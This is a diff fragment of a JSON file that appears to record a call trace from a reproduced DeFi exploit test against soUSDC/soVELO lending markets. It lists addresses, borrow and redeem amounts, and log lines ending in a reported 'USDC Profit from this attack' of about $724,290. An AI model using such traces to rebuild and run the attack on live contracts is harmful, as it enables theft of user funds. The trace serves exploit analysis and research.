+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "9660",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "362",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1131576108522846970 [1.131e18]"
+    },
+    {
+        "id": "748",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "7841",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "7092",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "362",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1131576108522846970 [1.131e18]"
+    },
+    {
+        "id": "748",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "585",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F",
+        "original_code": null,
+        "description": null,
+        "return_value": "1046005468588 [1.046e12]"
+    },
+    {
+        "id": "34994",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 768947220961 [7.689e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "585",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "768947220961 [7.689e11]"
+    },
+    {
+        "id": "0",
+        "args": "\"usdc_amount_after_borrow\", 768947220961 [7.689e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "93985",
+        "args": "35469150965253049864450448 [3.546e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "563",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "35469150965253049864450449 [3.546e25]"
+    },
+    {
+        "id": "56372",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "55661",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3229",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0, 0, 768947220961 [7.689e11], 219145563753097 [2.191e14]"
+    },
+    {
+        "id": "585",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F",
+        "original_code": null,
+        "description": null,
+        "return_value": "277058247627 [2.77e11]"
+    },
+    {
+        "id": "12470",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F",
+        "original_code": null,
+        "description": null,
+        "return_value": "1000131720000000000000000000000 [1e30]"
+    },
+    {
+        "id": "1309",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"soUSDC\""
+    },
+    {
+        "id": "1118",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "276",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "3143",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18446744073709554517 [1.844e19], 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 18446744073709554517 [1.844e19]"
+    },
+    {
+        "id": "1410",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2901, 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 2901"
+    },
+    {
+        "id": "2729",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0, 2, 0, 17734575482626524932225224500000000000000000 [1.773e43]"
+    },
+    {
+        "id": "563",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "35469150965253049864450449 [3.546e25]"
+    },
+    {
+        "id": "12336",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "124601260000000000 [1.246e17]"
+    },
+    {
+        "id": "1309",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"soVELO\""
+    },
+    {
+        "id": "1095",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "253",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "3235",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18446744073709553910 [1.844e19], 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 18446744073709553910 [1.844e19]"
+    },
+    {
+        "id": "1502",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2294, 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 2294"
+    },
+    {
+        "id": "2463",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1717",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "642",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2"
+    },
+    {
+        "id": "4623",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3895",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "642",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2"
+    },
+    {
+        "id": "563",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "35469150965253049864450449 [3.546e25]"
+    },
+    {
+        "id": "22994",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 35469150965253049864450448 [3.546e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1246",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 35469150965253049864450448 [3.546e25], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "612",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 35469150965253049864450448 [3.546e25], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "563",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "35469150965253049864450448 [3.546e25]"
+    },
+    {
+        "id": "0",
+        "args": "\"Velo_amount_of_Attacker_after_redeem\", 35469150965253049864450448 [3.546e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3094",
+        "args": "0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, 35469150965253049864450448 [3.546e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "11094",
+        "args": "0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, 44656863632 [4.465e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "585",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "724290357329 [7.242e11]"
+    },
+    {
+        "id": "0",
+        "args": "\"---------------------------------------------------\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"USDC Profit from this attack: $\", 724290 [7.242e5]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"---------------------------------------------------\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "585",
+        "args": "0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5",
+        "original_code": null,
+        "description": null,
+        "return_value": "4424234269004 [4.424e12]"
+    },
+    {
+        "id": "563",
+        "args": "0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5",
+        "original_code": null,
+        "description": null,
+        "return_value": "35564486528817858126012822 [3.556e25]"
+    },
+    {
+        "id": "2784",
+        "args": "0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000064"
+    },
+    {
+        "id": "11094",
+        "args": "0xC1CaB7d0a55eB192A077981864938f773Ef398Fc, 446568636 [4.465e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "784",
+        "args": "0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000064"
+    },
+    {
+        "id": "7894",
+        "args": "0xC1CaB7d0a55eB192A077981864938f773Ef398Fc, 354691509652530498644504 [3.546e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "585",
+        "args": "0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5",
+        "original_code": null,
+        "description": null,
+        "return_value": "4423787700368 [4.423e12]"
+    },
+    {
+        "id": "563",
+        "args": "0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5",
+        "original_code": null,
+        "description": null,
+        "return_value": "35209795019165327627368318 [3.52e25]"
+    }
+]
